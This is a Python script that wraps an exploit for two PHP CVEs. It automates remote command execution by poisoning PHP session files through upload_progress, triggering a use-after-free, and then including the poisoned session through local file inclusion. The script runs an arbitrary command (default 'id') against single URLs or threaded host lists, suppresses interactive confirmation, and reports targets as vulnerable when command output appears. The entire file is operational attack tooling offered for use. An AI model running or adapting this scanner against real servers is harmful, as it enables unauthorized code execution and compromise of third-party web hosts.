#!/usr/bin/env python3
"""PHP2Shell Session-Poison UAF — CVE-2026-109618/109619 (Syrex1013).

Wraps xplotas/php2shell/xplota_8/poc.py for the Xplota UI.
Full attack chain: session file poisoning via upload_progress + UAF trigger
+ LFI to execute the poisoned session. Works on any SAPI (mod_php + FPM).
HTTPS supported via ssl module.

Attack chain:
  1. POST multipart with PHP code in filename → session file poisoned
  2. Slow chunked upload + concurrent session disturbance → UAF in rfc1867
  3. LFI includes poisoned session → command output extracted

Usage:
    python3 scanner.py -u https://target.com/index.php -o results.json
    python3 scanner.py -l hosts.txt -o results.json
"""
from __future__ import annotations

import argparse, json, os, subprocess, sys, threading, time
from pathlib import Path
from typing import Any
from urllib.parse import urlsplit

CVES = "CVE-2026-109618 / CVE-2026-109619"
_HERE = Path(__file__).resolve().parent
_EXPLOIT = _HERE.parents[2] / "xplotas" / "php2shell" / "xplota_8" / "poc.py"

_CRASH_MARKERS = ("Traceback", "RuntimeError:", "ConnectionRefusedError:", "TimeoutError:")
_VULN_SIGNALS = ("[+]", "RCE confirmed", "command output", "uid=", "root")


def _parse_url(raw: str) -> str:
    raw = raw.strip()
    if "://" not in raw:
        raw = "http://" + raw
    return raw


def _run(target: str, cmd: str, modes: str, rounds: int, timeout: int,
         lfi_param: str, probe_only: bool) -> dict[str, Any]:
    url = _parse_url(target)
    args = [sys.executable, "-u", str(_EXPLOIT), url]
    if cmd:
        args.append(cmd)
    if modes and modes != "all":
        args += ["--modes", modes]
    if rounds:
        args += ["--rounds", str(rounds)]
    if lfi_param:
        args += ["--lfi-param", lfi_param]
    if probe_only:
        args.append("--probe-only")
    args += ["--no-verify"]  # don't prompt interactively

    t0 = time.monotonic()
    lines: list[str] = []
    error: str | None = None
    exit_code: int | None = None

    try:
        proc = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            cwd=str(_EXPLOIT.parent), env={**os.environ, "PYTHONUNBUFFERED": "1"},
            text=True, encoding="utf-8", errors="replace")
        assert proc.stdout
        for line in proc.stdout:
            line = line.rstrip("\r\n")
            if line:
                print(f"[LOG] {line}", flush=True)
                lines.append(line)
        proc.wait(timeout=5)
        exit_code = proc.returncode
    except FileNotFoundError:
        error = f"exploit not found: {_EXPLOIT}"; exit_code = -2
    except Exception as exc:
        error = str(exc); exit_code = -3

    stdout = "\n".join(lines)
    is_crash = exit_code == 1 and any(m in stdout for m in _CRASH_MARKERS)
    is_vuln = exit_code == 0 or any(sig in stdout for sig in _VULN_SIGNALS)

    if error and exit_code not in (0, 1):
        vuln, verdict, reason = None, "ERROR", error
    elif is_crash:
        vuln, verdict = None, "INCONCLUSIVE"
        reason = next((l.strip() for l in lines if any(m in l for m in _CRASH_MARKERS)), "Exploit crashed")
    elif is_vuln:
        vuln, verdict = True, "VULNERABLE"
        reason = next((l.split("]", 1)[-1].strip() for l in reversed(lines) if "[+]" in l),
                      "Session-poison UAF chain succeeded")
    else:
        vuln, verdict, reason = False, "NOT VULNERABLE", "Session poison chain failed — target appears patched"

    bracket = "VULNERABLE" if vuln is True else ("NOT VULNERABLE" if vuln is False else "INCONCLUSIVE")
    print(f"[{bracket}] {target} - {reason}", flush=True)
    return {"target": target, "url": target, "tested_url": url,
            "vulnerable": vuln, "verdict": verdict, "reason": reason,
            "error": error, "elapsed": round(time.monotonic() - t0, 2),
            "exit_code": exit_code, "log": stdout[-4096:]}


def main() -> None:
    ap = argparse.ArgumentParser()
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("-u", "--url"); g.add_argument("-l", "--list")
    ap.add_argument("-o", "--output", required=True)
    ap.add_argument("-t", "--threads", type=int, default=5)
    ap.add_argument("--timeout", type=int, default=60)
    ap.add_argument("--no-color", action="store_true")
    ap.add_argument("--verbose", "-v", action="store_true")
    ap.add_argument("--all-results", action="store_true")
    ap.add_argument("--cmd", default="id", help="Command to execute")
    ap.add_argument("--modes", default="all", help="Attack modes: all / uaf / lfi / race")
    ap.add_argument("--rounds", default="5", help="Exploitation rounds per target")
    ap.add_argument("--lfi-param", default="", help="LFI parameter name if known")
    ap.add_argument("--probe-only", action="store_true")
    args = ap.parse_args()

    targets = ([args.url.strip()] if args.url else
               [l.strip() for l in Path(args.list).read_text().splitlines()
                if l.strip() and not l.startswith("#")])
    if not targets: raise SystemExit("No targets")

    results: list[dict] = []
    lock = threading.Lock()

    def process(t: str) -> None:
        r = _run(t, args.cmd, args.modes, int(args.rounds), args.timeout,
                 args.lfi_param, args.probe_only)
        with lock:
            if args.all_results or r["vulnerable"] is not False:
                results.append(r)

    threads = min(args.threads, 10)
    if threads <= 1 or len(targets) == 1:
        for t in targets: process(t)
    else:
        from concurrent.futures import ThreadPoolExecutor, as_completed
        with ThreadPoolExecutor(max_workers=threads) as pool:
            for f in as_completed({pool.submit(process, t): t for t in targets}):
                try: f.result()
                except Exception as e: print(f"[ERROR] {e}", flush=True)

    Path(args.output).write_text(json.dumps(results, indent=2), encoding="utf-8")
    raise SystemExit(1 if any(r["vulnerable"] for r in results) else 0)


if __name__ == "__main__":
    main()
